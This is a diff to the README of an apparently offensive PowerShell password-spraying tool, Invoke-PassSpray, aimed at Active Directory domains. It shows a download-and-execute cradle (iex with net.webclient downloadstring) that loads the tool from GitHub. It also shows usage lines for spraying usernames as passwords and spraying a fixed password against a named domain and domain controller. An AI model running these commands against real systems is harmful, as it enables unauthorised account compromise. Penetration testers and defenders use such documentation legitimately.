@@ -12,18 +12,21 @@ iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/
 ```
 Invoke-PassSpray
 ```
+```
+Invoke-PassSpray -Machines
+```
 
 ### Spray UserName as a password
 ```
 Invoke-PassSpray -UserAsPassword
 ```
 
-### Spray a password across the Domain
+### Spray a defined password
 ```
 Invoke-PassSpray -Password P@ssw0rd!
 ```
 
-### Spray a password across the Domain - Specify Domain and DC
+### Specify Domain and DC
 ```
 Invoke-PassSpray -Password P@ssw0rd! -Domain ferrari.local -DomainController DC01.ferrari.local
 ```
